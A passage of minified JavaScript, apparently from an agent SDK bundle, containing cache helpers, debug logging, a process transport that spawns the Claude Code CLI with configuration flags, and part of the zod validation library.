J=this.__data__,Y=IW(J,X);if(Y<0)++this.size,J.push([X,Q]);else J[Y][1]=Q;return this}function g5(X){var Q=-1,J=X==null?0:X.length;this.clear();while(++Q<J){var Y=X[Q];this.set(Y[0],Y[1])}}function ol1(){this.size=0,this.__data__={hash:new BN,map:new(al1||rl1),string:new BN}}function tl1(X){var Q=typeof X;return Q=="string"||Q=="number"||Q=="symbol"||Q=="boolean"?X!=="__proto__":X===null}function Xp1(X,Q){var J=X.__data__;return el1(Q)?J[typeof Q=="string"?"string":"hash"]:J.map}function Qp1(X){var Q=CW(this,X).delete(X);return this.size-=Q?1:0,Q}function Yp1(X){return CW(this,X).get(X)}function Gp1(X){return CW(this,X).has(X)}function $p1(X,Q){var J=CW(this,X),Y=J.size;return J.set(X,Q),this.size+=J.size==Y?0:1,this}function m5(X){var Q=-1,J=X==null?0:X.length;this.clear();while(++Q<J){var Y=X[Q];this.set(Y[0],Y[1])}}function GK(X,Q){if(typeof X!="function"||Q!=null&&typeof Q!="function")throw TypeError(Up1);var J=function(){var Y=arguments,W=Q?Q.apply(this,Y):Y[0],G=J.cache;if(G.has(W))return G.get(W);var H=X.apply(this,Y);return J.cache=G.set(W,H)||G,H};return J.cache=new(GK.Cache||Qw),J}function Kp1(X){if(process.stderr.destroyed)return;for(let Q=0;Q<X.length;Q+=qN)process.stderr.write(X.substring(Q,Q+qN))}function Bp1(X){let Q=[],J=X.match(/^MCP server ["']([^"']+)["']/);if(J&&J[1])Q.push("mcp"),Q.push(J[1].toLowerCase());else{let G=X.match(/^([^:[]+):/);if(G&&G[1])Q.push(G[1].trim().toLowerCase())}let Y=X.match(/^\[([^\]]+)]/);if(Y&&Y[1])Q.push(Y[1].trim().toLowerCase());if(X.toLowerCase().includes("statsig event:"))Q.push("statsig");let W=X.match(/:\s*([^:]+?)(?:\s+(?:type|mode|status|event))?:/);if(W&&W[1]){let G=W[1].trim().toLowerCase();if(G.length<30&&!G.includes(" "))Q.push(G)}return Array.from(new Set(Q))}function qp1(X,Q){if(!Q)return!0;if(X.length===0)return!1;if(Q.isExclusive)return!X.some((J)=>Q.exclude.includes(J));else return X.some((J)=>Q.include.includes(J))}function Zp1(X,Q){if(!Q)return!0;let J=Bp1(X);return qp1(J,Q)}function Jw(){return process.env.CLAUDE_CONFIG_DIR??Mp1(jp1(),".claude")}function ZN(X){if(!X)return!1;if(typeof X==="boolean")return X;let Q=X.toLowerCase().trim();return["1","true","yes","on"].includes(Q)}function Ww(X){return{name:X,default:JW,validate:(Q)=>{if(!Q)return{effective:JW,status:"valid"};let J=parseInt(Q,10);if(isNaN(J)||J<=0)return{effective:JW,status:"invalid",message:`Invalid value "${Q}" (using default: ${JW})`};if(J>uU)return{effective:uU,status:"capped",message:`Capped from ${J} to ${uU}`};return{effective:J,status:"valid"}}}}function Dp1(){let X="";if(typeof process<"u"&&typeof process.cwd==="function")X=Op1(Fp1());return{originalCwd:X,totalCostUSD:0,totalAPIDuration:0,totalAPIDurationWithoutRetries:0,totalToolDuration:0,startTime:Date.now(),lastInteractionTime:Date.now(),totalLinesAdded:0,totalLinesRemoved:0,hasUnknownModelCost:!1,cwd:X,modelUsage:{},mainLoopModelOverride:void 0,initialMainLoopModel:null,modelStrings:null,isInteractive:!1,clientType:"cli",sessionIngressToken:void 0,oauthTokenFromFd:void 0,apiKeyFromFd:void 0,flagSettingsPath:void 0,allowedSettingSources:["userSettings","projectSettings","localSettings","flagSettings","policySettings"],meter:null,sessionCounter:null,locCounter:null,prCounter:null,commitCounter:null,costCounter:null,tokenCounter:null,codeEditToolDecisionCounter:null,activeTimeCounter:null,sessionId:Ap1(),loggerProvider:null,eventLogger:null,meterProvider:null,tracerProvider:null,agentColorMap:new Map,agentColorIndex:0,envVarValidators:[Rp1,Lp1],lastAPIRequest:null,inMemoryErrorLog:[],inlinePlugins:[],sessionBypassPermissionsMode:!1,sessionPersistenceDisabled:!1,hasExitedPlanMode:!1,needsPlanModeExitAttachment:!1,hasExitedDelegateMode:!1,needsDelegateModeExitAttachment:!1,lspRecommendationShownThisSession:!1,initJsonSchema:null,registeredHooks:null,planSlugCache:new Map,teleportedSessionInfo:null,invokedSkills:new Map,slowOperations:[],sdkBetas:void 0}}function Np1(){return B7.sessionId}function Gw(X,Q){return}function Ip1({writeFn:X,flushIntervalMs:Q=1000,maxBufferSize:J=100,immediateMode:Y=!1}){let W=[],G=null;function H(){if(G)clearTimeout(G),G=null}function $(){if(W.length===0)return;X(W.join("")),W=[],H()}function z(){if(!G)G=setTimeout($,Q)}return{write(U){if(Y){X(U);return}if(W.push(U),z(),W.length>=J)$()},flush:$,dispose(){$()}}}function Cp1(X){return jN.add(X),()=>jN.delete(X)}function Pp1(X){if(X===null)return"null";if(X===void 0)return"undefined";if(Array.isArray(X))return`Array[${X.length}]`;if(typeof X==="object")return`Object{${Object.keys(X).length} keys}`;if(typeof X==="string")return`string(${X.length} chars)`;return typeof X}function $w(X,Q){let J=performance.now();try{return Q()}finally{let Y=performance.now()-J;if(Y>Hw)b8(`[SLOW OPERATION DETECTED] ${X} (${Y.toFixed(1)}ms)`),Gw(X,Y)}}function J8(X,Q,J){let Y=Pp1(X);return $w(`JSON.stringify(${Y})`,()=>JSON.stringify(X,Q,J))}function Tp1(X){if(typeof process>"u"||typeof process.versions>"u"||typeof process.versions.node>"u")return!1;let Q=Ep1();return Zp1(X,Q)}function kp1(){if(!YW)YW=Ip1({writeFn:(X)=>{let Q=Kw();if(!v8().existsSync(iU(Q)))v8().mkdirSync(iU(Q));v8().appendFileSync(Q,X),bp1()},flushIntervalMs:1000,maxBufferSize:100,immediateMode:Sp1()}),Cp1(async()=>YW?.dispose());return YW}function b8(X,{level:Q}={level:"debug"}){if(!Tp1(X))return;if(_p1&&X.includes(`
`))X=J8(X);let Y=`${new Date().toISOString()} [${Q.toUpperCase()}] ${X.trim()}
`;if(Uw()){Kp1(Y);return}kp1().write(Y)}function Kw(){return process.env.CLAUDE_CODE_DEBUG_LOGS_DIR??Yw(Jw(),"debug",`${Np1()}.txt`)}function X9(X,Q){let J=performance.now();try{return Q()}finally{let Y=performance.now()-J;if(Y>Hw)b8(`[SLOW OPERATION DETECTED] fs.${X} (${Y.toFixed(1)}ms)`),Gw(`fs.${X}`,Y)}}function v8(){return xp1}function Vw(){return process.versions.bun!==void 0}function mp1(){if(ON)return WW;if(ON=!0,!process.env.DEBUG_CLAUDE_AGENT_SDK)return null;let X=FN(Jw(),"debug");if(WW=FN(X,`sdk-${fp1()}.txt`),!yp1(X))gp1(X,{recursive:!0});return process.stderr.write(`SDK debug logs: ${WW}
`),WW}function V7(X){let Q=mp1();if(!Q)return;let Y=`${new Date().toISOString()} ${X}
`;hp1(Q,Y)}function up1(X,Q){let J={...X};if(Q){let Y={sandbox:Q};if(J.settings)try{Y={...zw(J.settings),sandbox:Q}}catch{}J.settings=J8(Y)}return J}class Bw{options;process;processStdin;processStdout;ready=!1;abortController;exitError;exitListeners=[];processExitHandler;abortHandler;constructor(X){this.options=X,this.abortController=X.abortController||sN(),this.initialize()}getDefaultExecutable(){return Vw()?"bun":"node"}spawnLocalProcess(X){let{command:Q,args:J,cwd:Y,env:W,signal:G}=X,H=W.DEBUG_CLAUDE_AGENT_SDK||this.options.stderr?"pipe":"ignore",$=Nc1(Q,J,{cwd:Y,stdio:["pipe","pipe",H],signal:G,env:W,windowsHide:!0});if(W.DEBUG_CLAUDE_AGENT_SDK||this.options.stderr)$.stderr.on("data",(U)=>{let K=U.toString();if(V7(K),this.options.stderr)this.options.stderr(K)});return{stdin:$.stdin,stdout:$.stdout,get killed(){return $.killed},get exitCode(){return $.exitCode},kill:$.kill.bind($),on:$.on.bind($),once:$.once.bind($),off:$.off.bind($)}}initialize(){try{let{additionalDirectories:X=[],betas:Q,cwd:J,executable:Y=this.getDefaultExecutable(),executableArgs:W=[],extraArgs:G={},pathToClaudeCodeExecutable:H,env:$={...process.env},maxThinkingTokens:z,maxTurns:U,maxBudgetUsd:K,model:B,fallbackModel:q,jsonSchema:Z,permissionMode:M,allowDangerouslySkipPermissions:L,permissionPromptToolName:R,continueConversation:j,resume:F,settingSources:A,allowedTools:O=[],disallowedTools:w=[],tools:N,mcpServers:C,strictMcpConfig:_,canUseTool:h,includePartialMessages:o,plugins:p,sandbox:e}=this.options,d=["--output-format","stream-json","--verbose","--input-format","stream-json"];if(z!==void 0)d.push("--max-thinking-tokens",z.toString());if(U)d.push("--max-turns",U.toString());if(K!==void 0)d.push("--max-budget-usd",K.toString());if(B)d.push("--model",B);if(Q&&Q.length>0)d.push("--betas",Q.join(","));if(Z)d.push("--json-schema",J8(Z));if($.DEBUG_CLAUDE_AGENT_SDK)d.push("--debug-to-stderr");if(h){if(R)throw Error("canUseTool callback cannot be used with permissionPromptToolName. Please use one or the other.");d.push("--permission-prompt-tool","stdio")}else if(R)d.push("--permission-prompt-tool",R);if(j)d.push("--continue");if(F)d.push("--resume",F);if(O.length>0)d.push("--allowedTools",O.join(","));if(w.length>0)d.push("--disallowedTools",w.join(","));if(N!==void 0)if(Array.isArray(N))if(N.length===0)d.push("--tools","");else d.push("--tools",N.join(","));else d.push("--tools","default");if(C&&Object.keys(C).length>0)d.push("--mcp-config",J8({mcpServers:C}));if(A)d.push("--setting-sources",A.join(","));if(_)d.push("--strict-mcp-config");if(M)d.push("--permission-mode",M);if(L)d.push("--allow-dangerously-skip-permissions");if(q){if(B&&q===B)throw Error("Fallback model cannot be the same as the main model. Please specify a different model for fallbackModel option.");d.push("--fallback-model",q)}if(o)d.push("--include-partial-messages");for(let E of X)d.push("--add-dir",E);if(p&&p.length>0)for(let E of p)if(E.type==="local")d.push("--plugin-dir",E.path);else throw Error(`Unsupported plugin type: ${E.type}`);if(this.options.forkSession)d.push("--fork-session");if(this.options.resumeSessionAt)d.push("--resume-session-at",this.options.resumeSessionAt);if(this.options.persistSession===!1)d.push("--no-session-persistence");let Q1=up1(G??{},e);for(let[E,y]of Object.entries(Q1))if(y===null)d.push(`--${E}`);else d.push(`--${E}`,y);if(!$.CLAUDE_CODE_ENTRYPOINT)$.CLAUDE_CODE_ENTRYPOINT="sdk-ts";if(delete $.NODE_OPTIONS,$.DEBUG_CLAUDE_AGENT_SDK)$.DEBUG="1";else delete $.DEBUG;let V1=cp1(H),D1=V1?H:Y,n=V1?[...W,...d]:[...W,H,...d],t={command:D1,args:n,cwd:J,env:$,signal:this.abortController.signal};if(this.options.spawnClaudeCodeProcess)V7(`Spawning Claude Code (custom): ${D1} ${n.join(" ")}`),this.process=this.options.spawnClaudeCodeProcess(t);else{if(!v8().existsSync(H)){let y=V1?`Claude Code native binary not found at ${H}. Please ensure Claude Code is installed via native installer or specify a valid path with options.pathToClaudeCodeExecutable.`:`Claude Code executable not found at ${H}. Is options.pathToClaudeCodeExecutable set?`;throw ReferenceError(y)}V7(`Spawning Claude Code: ${D1} ${n.join(" ")}`),this.process=this.spawnLocalProcess(t)}this.processStdin=this.process.stdin,this.processStdout=this.process.stdout;let u=()=>{if(this.process&&!this.process.killed)this.process.kill("SIGTERM")};this.processExitHandler=u,this.abortHandler=u,process.on("exit",this.processExitHandler),this.abortController.signal.addEventListener("abort",this.abortHandler),this.process.on("error",(E)=>{if(this.ready=!1,this.abortController.signal.aborted)this.exitError=new E5("Claude Code process aborted by user");else this.exitError=Error(`Failed to spawn Claude Code process: ${E.message}`),V7(this.exitError.message)}),this.process.on("exit",(E,y)=>{if(this.ready=!1,this.abortController.signal.aborted)this.exitError=new E5("Claude Code process aborted by user");else{let a=this.getProcessExitError(E,y);if(a)this.exitError=a,V7(a.message)}}),this.ready=!0}catch(X){throw this.ready=!1,X}}getProcessExitError(X,Q){if(X!==0&&X!==null)return Error(`Claude Code process exited with code ${X}`);else if(Q)return Error(`Claude Code process terminated by signal ${Q}`);return}write(X){if(this.abortController.signal.aborted)throw new E5("Operation aborted");if(!this.ready||!this.processStdin)throw Error("ProcessTransport is not ready for writing");if(this.process?.killed||this.process?.exitCode!==null)throw Error("Cannot write to terminated process");if(this.exitError)throw Error(`Cannot write to process that exited with error: ${this.exitError.message}`);V7(`[ProcessTransport] Writing to stdin: ${X.substring(0,100)}`);try{if(!this.processStdin.write(X))V7("[ProcessTransport] Write buffer full, data queued")}catch(Q){throw this.ready=!1,Error(`Failed to write to process stdin: ${Q.message}`)}}close(){if(this.processStdin)this.processStdin.end(),this.processStdin=void 0;if(this.abortHandler)this.abortController.signal.removeEventListener("abort",this.abortHandler),this.abortHandler=void 0;for(let{handler:X}of this.exitListeners)this.process?.off("exit",X);if(this.exitListeners=[],this.process&&!this.process.killed)this.process.kill("SIGTERM"),setTimeout(()=>{if(this.process&&!this.process.killed)this.process.kill("SIGKILL")},5000);if(this.ready=!1,this.processExitHandler)process.off("exit",this.processExitHandler),this.processExitHandler=void 0}isReady(){return this.ready}async*readMessages(){if(!this.processStdout)throw Error("ProcessTransport output stream not available");let X=wc1({input:this.processStdout});try{for await(let Q of X)if(Q.trim())yield zw(Q);await this.waitForExit()}catch(Q){throw Q}finally{X.close()}}endInput(){if(this.processStdin)this.processStdin.end()}getInputStream(){return this.processStdin}onExit(X){if(!this.process)return()=>{};let Q=(J,Y)=>{let W=this.getProcessExitError(J,Y);X(W)};return this.process.on("exit",Q),this.exitListeners.push({callback:X,handler:Q}),()=>{if(this.process)this.process.off("exit",Q);let J=this.exitListeners.findIndex((Y)=>Y.handler===Q);if(J!==-1)this.exitListeners.splice(J,1)}}async waitForExit(){if(!this.process){if(this.exitError)throw this.exitError;return}if(this.process.exitCode!==null||this.process.killed){if(this.exitError)throw this.exitError;return}return new Promise((X,Q)=>{let J=(W,G)=>{if(this.abortController.signal.aborted){Q(new E5("Operation aborted"));return}let H=this.getProcessExitError(W,G);if(H)Q(H);else X()};this.process.once("exit",J);let Y=(W)=>{this.process.off("exit",J),Q(W)};this.process.once("error",Y),this.process.once("exit",()=>{this.process.off("error",Y)})})}}function cp1(X){return![".js",".mjs",".tsx",".ts",".jsx"].some((J)=>X.endsWith(J))}class Zw{sendMcpMessage;isClosed=!1;constructor(X){this.sendMcpMessage=X}onclose;onerror;onmessage;async start(){}async send(X){if(this.isClosed)throw Error("Transport is closed");this.sendMcpMessage(X)}async close(){if(this.isClosed)return;this.isClosed=!0,this.onclose?.()}}function rU(){return dp1}function C1(X,Q){let J=rU(),Y=nU({issueData:Q,data:X.data,path:X.path,errorMaps:[X.common.contextualErrorMap,X.schemaErrorMap,J,J===NQ?void 0:NQ].filter((W)=>!!W)});X.common.issues.push(Y)}class _9{constructor(){this.value="valid"}dirty(){if(this.value==="valid")this.value="dirty"}abort(){if(this.value!=="aborted")this.value="aborted"}static mergeArray(X,Q){let J=[];for(let Y of Q){if(Y.status==="aborted")return X0;if(Y.status==="dirty")X.dirty();J.push(Y.value)}return{status:X.value,value:J}}static async mergeObjectAsync(X,Q){let J=[];for(let Y of Q){let W=await Y.key,G=await Y.value;J.push({key:W,value:G})}return _9.mergeObjectSync(X,J)}static mergeObjectSync(X,Q){let J={};for(let Y of Q){let{key:W,value:G}=Y;if(W.status==="aborted")return X0;if(G.status==="aborted")return X0;if(W.status==="dirty")X.dirty();if(G.status==="dirty")X.dirty();if(W.value!=="__proto__"&&(typeof G.value<"u"||Y.alwaysSet))J[W.value]=G.value}return{status:X.value,value:J}}}class b6{constructor(X,Q,J,Y){this._cachedPath=[],this.parent=X,this.data=Q,this._path=J,this._key=Y}get path(){if(!this._cachedPath.length)if(Array.isArray(this._key))this._cachedPath.push(...this._path,...this._key);else this._cachedPath.push(...this._path,this._key);return this._cachedPath}}function H0(X){if(!X)return{};let{errorMap:Q,invalid_type_error:J,required_error:Y,description:W}=X;if(Q&&(J||Y))throw Error(`Can't use "invalid_type_error" or "required_error" in conjunction with custom error map.`);if(Q)return{errorMap:Q,description:W};return{errorMap:(H,$)=>{let{message:z}=X;if(H.code==="invalid_enum_value")return{message:z??$.defaultError};if(typeof $.data>"u")return{message:z??Y??$.defaultError};if(H.code!=="invalid_type")return{message:$.defaultError};return{message:z??J??$.defaultError}},description:W}}class B0{get description(){return this._def.description}_getType(X){return DX(X.data)}_getOrReturnCtx(X,Q){return Q||{common:X.parent.common,data:X.data,parsedType:DX(X.data),schemaErrorMap:this._def.errorMap,path:X.path,parent:X.parent}}_processInputParams(X){return{status:new _9,ctx:{common:X.parent.common,data:X.data,parsedType:DX(X.data),schemaErrorMap:this._def.errorMap,path:X.path,parent:X.parent}}}_parseSync(X){let Q=this._parse(X);if(VW(Q))throw Error("Synchronous parse encountered promise.");return Q}_parseAsync(X){let Q=this._parse(X);return Promise.resolve(Q)}parse(X,Q){let J=this.safeParse(X,Q);if(J.success)return J.data;throw J.error}safeParse(X,Q){let J={common:{issues:[],async:Q?.async??!1,contextualErrorMap:Q?.errorMap},path:Q?.path||[],schemaErrorMap:this._def.errorMap,parent:null,data:X,parsedType:DX(X)},Y=this._parseSync({data:X,path:J.path,parent:J});return DN(J,Y)}"~validate"(X){let Q={common:{issues:[],async:!!this["~standard"].async},path:[],schemaErrorMap:this._def.errorMap,parent:null,data:X,parsedType:DX(X)};if(!this["~standard"].async)try{let J=this._parseSync({data:X,path:[],parent:Q});return _5(J)?{value:J.value}:{issues:Q.common.issues}}catch(J){if(J?.message?.toLowerCase()?.includes("encountered"))this["~standard"].async=!0;Q.common={issues:[],async:!0}}return this._parseAsync({data:X,path:[],parent:Q}).then((J)=>_5(J)?{value:J.value}:{issues:Q.common.issues})}async parseAsync(X,Q){let J=await this.safeParseAsync(X,Q);if(J.success)return J.data;throw J.error}async safeParseAsync(X,Q){let J={common:{issues:[],contextualErrorMap:Q?.errorMap,async:!0},path:Q?.path||[],schemaErrorMap:this._def.errorMap,parent:null,data:X,parsedType:DX(X)},Y=this._parse({data:X,path:J.path,parent:J}),W=await(VW(Y)?Y:Promise.resolve(Y));return DN(J,W)}refine(X,Q){let J=(Y)=>{if(typeof Q==="string"||typeof Q>"u")return{message:Q};else if(typeof Q==="function")return Q(Y);else return Q};return this._refinement((Y,W)=>{let G=X(Y),H=()=>W.addIssue({code:q1.custom,...J(Y)});if(typeof Promise<"u"&&G instanceof Promise)return G.then(($)=>{if(!$)return H(),!1;else return!0});if(!G)return H(),!1;else return!0})}refinement(X,Q){return this._refinement((J,Y)=>{if(!X(J))return Y.addIssue(typeof Q==="function"?Q(J,Y):Q),!1;else return!0})}_refinement(X){return new H8({schema:this,typeName:Q0.ZodEffects,effect:{type:"refinement",refinement:X}})}superRefine(X){return this._refinement(X)}constructor(X){this.spa=this.safeParseAsync,this._def=X,this.parse=this.parse.bind(this),this.safeParse=this.safeParse.bind(this),this.parseAsync=this.parseAsync.bind(this),this.safeParseAsync=this.safeParseAsync.bind(this),this.spa=this.spa.bind(this),this.refine=this.refine.bind(this),this.refinement=this.refinement.bind(this),this.superRefine=this.superRefine.bind(this),this.optional=this.optional.bind(this),this.nullable=this.nullable.bind(this),this.nullish=this.nullish.bind(this),this.array=this.array.bind(this),this.promise=this.promise.bind(this),this.or=this.or.bind(this),this.and=this.and.bind(this),this.transform=this.transform.bind(this),this.brand=this.brand.bind(this),this.default=this.default.bind(this),this.catch=this.catch.bind(this),this.describe=this.describe.bind(this),this.pipe=this.pipe.bind(this),this.readonly=this.readonly.bind(this),this.isNullable=this.isNullable.bind(this),this.isOptional=this.isOptional.bind(this),this["~standard"]={version:1,vendor:"zod",validate:(Q)=>this["~validate"](Q)}}optional(){return W8.create(this,this._def)}nullable(){return wX.create(this,this._def)}nullish(){return this.nullable().optional()}array(){return Y8.create(this)}promise(){return x5.create(this,this._def)}or(X){return PQ.create([this,X],this._def)}and(X){return SQ.create(this,X,this._def)}transform(X){return new H8({...H0(this._def),schema:this,typeName:Q0.ZodEffects,effect:{type:"transform",transform:X}})}default(X){let Q=typeof X==="function"?X:()=>X;return new kQ({...H0(this._def),innerType:this,defaultValue:Q,typeName:Q0.ZodDefault})}brand(){return new $K({typeName:Q0.ZodBranded,type:this,...H0(this._def)})}catch(X){let Q=typeof X==="function"?X:()=>X;return new bQ({...H0(this._def),innerType:this,catchValue:Q,typeName:Q0.ZodCatch})}describe(X){return new this.constructor({...this._def,description:X})}pipe(X){return PW.create(this,X)}readonly(){return vQ.create(this)}isOptional(){return this.safeParse(void 0).success}isNullable(){return this.safeParse(null).success}}function Fw(X){let Q="[0-5]\\d";if(X.precision)Q=`${Q}\\.\\d{${X.precision}}`;else if(X.precision==null)Q=`${Q}(\\.\\d+)?`;let J=X.precision?"+":"?";return`([01]\\d|2[0-3]):[0-5]\\d(:${Q})${J}`}function zd1(X){return new RegExp(`^${Fw(X)}$`)}function Ud1(X){let Q=`${jw}T${Fw(X)}`,J=[];if(J.push(X.local?"Z?":"Z"),X.offset)J.push("([+-]\\d{2}:?\\d{2})");return Q=`${Q}(${J.join("|")})`,new RegExp(`^${Q}$`)}function Kd1(X,Q){if((Q==="v4"||!Q)&&Qd1.test(X))return!0;if((Q==="v6"||!Q)&&Yd1.test(X))return!0;return!1}function Vd1(X,Q){if(!sp1.test(X))return!1;try{let[J]=X.split(".");if(!J)return!1;let Y=J.replace(/-/g,"+").replace(/_/g,"/").padEnd(J.length+(4-J.length%4)%4,"="),W=JSON.parse(atob(Y));if(typeof W!=="object"||W===null)return!1;if("typ"in W&&W?.typ!=="JWT")return!1;if(!W.alg)return!1;if(Q&&W.alg!==Q)return!1;return!0}catch{return!1}}function Bd1(X,Q){if((Q==="v4"||!Q)&&Jd1.test(X))return!0;if((Q==="v6"||!Q)&&Wd1.test(X))return!0;return!1}function qd1(X,Q){let J=(X.toString().split(".")[1]||"").length,Y=(Q.toString().split(".")[1]||"").length,W=J>Y?J:Y,G=Number.parseInt(X.toFixed(W).replace(".","")),H=Number.parseInt(Q.toFixed(W).replace(".",""));return G%H/10**W}function P5(X){if(X instanceof r0){let Q={};for(let J in X.shape){let Y=X.shape[J];Q[J]=W8.create(P5(Y))}return new r0({...X._def,shape:()=>Q})}else if(X instanceof Y8)return new Y8({...X._def,type:P5(X.element)});else if(X instanceof W8)return W8.create(P5(X.unwrap()));else if(X instanceof wX)return wX.create(P5(X.unwrap()));else if(X instanceof h8)return h8.create(X.items.map((Q)=>P5(Q)));else return X}function aU(X,Q){let J=DX(X),Y=DX(Q);if(X===Q)return{valid:!0,data:X};else if(J===T1.object&&Y===T1.object){let W=R0.objectKeys(Q),G=R0.objectKeys(X).filter(($)=>W.indexOf($)!==-1),H={...X,...Q};for(let $ of G){let z=aU(X[$],Q[$]);if(!z.valid)return{valid:!1};H[$]=z.data}return{valid:!0,data:H}}else if(J===T1.array&&Y===T1.array){if(X.length!==Q.length)return{valid:!1};let W=[];for(let G=0;G<X.length;G++){let H=X[G],$=Q[G],z=aU(H,$);if(!z.valid)return{valid:!1};W.push(z.data)}return{valid:!0,data:W}}else if(J===T1.date&&Y===T1.date&&+X===+Q)return{valid:!0,data:X};else return{valid:!1}}function Ow(X,Q){return new Z7({values:X,typeName:Q0.ZodEnum,...H0(Q)})}function W1(X,Q,J){function Y($,z){var U;Object.defineProperty($,"_zod",{value:$._zod??{},enumerable:!1}),(U=$._zod).traits??(U.traits=new Set),$._zod.traits.add(X),Q($,z);for(let K in H.prototype)if(!(K in $))Object.defineProperty($,K,{value:H.prototype[K].bind($)});$._zod.constr=H,$._zod.def=z}let W=J?.Parent??Object;class G extends W{}Object.defineProperty(G,"name",{value:X});function H($){var z;let U=J?.Parent?new G:this;Y(U,$),(z=U._zod).deferred??(z.deferred=[]);for(let K of U._zod.deferred)K();return U}return Object.defineProperty(H,"init",{value:Y}),Object.defineProperty(H,Symbol.hasInstance,{value:($)=>{if(J?.Parent&&$ instanceof J.Parent)return!0;return $?._zod?.traits?.has(X)}}),Object.defineProperty(H,"name",{value:X}),H}function y8(X){if(X)Object.assign(oU,X);return oU}function Zd1(X){return X}function Md1(X){return X}function jd1(X){}function Fd1(X){throw Error()}function Od1(X){}function Aw(X){let Q=Object.values(X).filter((Y)=>typeof Y==="number");return Object.entries(X).filter(([Y,W])=>Q.indexOf(+Y)===-1).map(([Y,W])=>W)}function sU(X,Q="|"){return X.map((J)=>KK(J)).join(Q)}function Rw(X,Q){if(typeof Q==="bigint")return Q.toString();return Q}function SW(X){return{get value(){{let J=X();return Object.defineProperty(this,"value",{value:J}),J}throw Error("cached value already set")}}}function EW(X){return X===null||X===void 0}function TW(X){let Q=X.startsWith("^")?1:0,J=X.endsWith("$")?X.length-1:X.length;return X.slice(Q,J)}function Lw(X,Q){let J=(X.toString().split(".")[1]||"").length,Y=(Q.toString().split(".")[1]||"").length,W=J>Y?J:Y,G=Number.parseInt(X.toFixed(W).replace(".","")),H=Number.parseInt(Q.toFixed(W).replace(".",""));return G%H/10**W}function f0(X,Q,J){Object.defineProperty(X,Q,{get(){{let W=J();return X[Q]=W,W}throw Error("cached value already set")},set(W){Object.defineProperty(X,Q,{value:W})},configurable:!0})}function zK(X,Q,J){Object.defineProperty(X,Q,{value:J,writable:!0,enumerable:!0,configurable:!0})}function Ad1(X,Q){if(!Q)return X;return Q.reduce((J,Y)=>J?.[Y],X)}function Rd1(X){let Q=Object.keys(X),J=Q.map((Y)=>X[Y]);return Promise.all(J).then((Y)=>{let W={};for(let G=0;G<Q.length;G++)W[Q[G]]=Y[G];return W})}function Ld1(X=10){let J="";for(let Y=0;Y<X;Y++)J+="abcdefghijklmnopqrstuvwxyz"[Math.floor(Math.random()*26)];return J}function S5(X){return JSON.stringify(X)}function xQ(X){return typeof X==="object"&&X!==null&&!Array.isArray(X)}function fQ(X){if(xQ(X)===!1)return!1;let Q=X.constructor;if(Q===void 0)return!0;let J=Q.prototype;if(xQ(J)===!1)return!1;if(Object.prototype.hasOwnProperty.call(J,"isPrototypeOf")===!1)return!1;return!0}function Dd1(X){let Q=0;for(let J in X)if(Object.prototype.hasOwnProperty.call(X,J))Q++;return Q}function u5(X){return X.replace(/[.*+?^${}()|[\]\\]/g,"\\$&")}function CX(X,Q,J){let Y=new X._zod.constr(Q??X._zod.def);if(!Q||J?.parent)Y._zod.parent=X;return Y}function t1(X){let Q=X;if(!Q)return{};if(typeof Q==="string")return{error:()=>Q};if(Q?.message!==void 0){if(Q?.error!==void 0)throw Error("Cannot specify both `message` and `error` params");Q.error=Q.message}if(delete Q.message,typeof Q.error==="string")return{...Q,error:()=>Q.error};return Q}function Id1(X){let Q;return new Proxy({},{get(J,Y,W){return Q??(Q=X()),Reflect.get(Q,Y,W)},set(J,Y,W,G){return Q??(Q=X()),Reflect.set(Q,Y,W,G)},has(J,Y){return Q??(Q=X()),Reflect.has(Q,Y)},deleteProperty(J,Y){return Q??(Q=X()),Reflect.deleteProperty(Q,Y)},ownKeys(J){return Q??(Q=X()),Reflect.ownKeys(Q)},getOwnPropertyDescriptor(J,Y){return Q??(Q=X()),Reflect.getOwnPropertyDescriptor(Q,Y)},defineProperty(J,Y,W){return Q??(Q=X()),Reflect.defineProperty(Q,Y,W)}})}function KK(X){if(typeof X==="bigint")return X.toString()+"n";if(typeof X==="string")return`"${X}"`;return`${X}`}function ww(X){return Object.keys(X).filter((Q)=>{return X[Q]._zod.optin==="optional"&&X[Q]._zod.optout==="optional"})}function Pd1(X,Q){let J={},Y=X._zod.def;for(let W in Q){if(!(W in Y.shape))throw Error(`Unrecognized key: "${W}"`);if(!Q[W])continue;J[W]=Y.shape[W]}return CX(X,{...X._zod.def,shape:J,checks:[]})}function Sd1(X,Q){let J={...X._zod.def.shape},Y=X._zod.def;for(let W in Q){if(!(W in Y.shape))throw Error(`Unrecognized key: "${W}"`);if(!Q[W])continue;delete J[W]}return CX(X,{...X._zod.def,shape:J,checks:[]})}function Ed1(X,Q){if(!fQ(Q))throw Error("Invalid input to extend: expected a plain object");let J={...X._zod.def,get shape(){let Y={...X._zod.def.shape,...Q};return zK(this,"shape",Y),Y},checks:[]};return CX(X,J)}function Td1(X,Q){return CX(X,{...X._zod.def,get shape(){let J={...X._zod.def.shape,...Q._zod.def.shape};return zK(this,"shape",J),J},catchall:Q._zod.def.catchall,checks:[]})}function _d1(X,Q,J){let Y=Q._zod.def.shape,W={...Y};if(J)for(let G in J){if(!(G in Y))throw Error(`Unrecognized key: "${G}"`);if(!J[G])continue;W[G]=X?new X({type:"optional",innerType:Y[G]}):Y[G]}else for(let G in Y)W[G]=X?new X({type:"optional",innerType:Y[G]}):Y[G];return CX(Q,{...Q._zod.def,shape:W,checks:[]})}function kd1(X,Q,J){let Y=Q._zod.def.shape,W={...Y};if(J)for(let G in J){if(!(G in W))throw Error(`Unrecognized key: "${G}"`);if(!J[G])continue;W[G]=new X({type:"nonoptional",innerType:Y[G]})}else for(let G in Y)W[G]=new X({type:"nonoptional",innerType:Y[G]});return CX(Q,{...Q._zod.def,shape:W,checks:[]})}function T5(X,Q=0){for(let J=Q;J<X.issues.length;J++)if(X.issues[J]?.continue!==!0)return!0;return!1}function NX(X,Q){return Q.map((J)=>{var Y;return(Y=J).path??(Y.path=[]),J.path.unshift(X),J})}function RQ(X){return typeof X==="string"?X:X?.message}function g8(X,Q,J){let Y={...X,path:X.path??[]};if(!X.message){let W=RQ(X.inst?._zod.def?.error?.(X))??RQ(Q?.error?.(X))??RQ(J.customError?.(X))??RQ(J.localeError?.(X))??"Invalid input";Y.message=W}if(delete Y.inst,delete Y.continue,!Q?.reportInput)delete Y.input;return Y}function bd1(X){if(X instanceof Set)return"set";if(X instanceof Map)return"map";if(X instanceof File)return"file";return"unknown"}function _W(X){if(Array.isArray(X))return"array";if(typeof X==="string")return"string";return"unknown"}function Cw(...X){let[Q,J,Y]=X;if(typeof Q==="string")return{message:Q,code:"custom",input:J,inst:Y};return{...Q}}function vd1(X){return 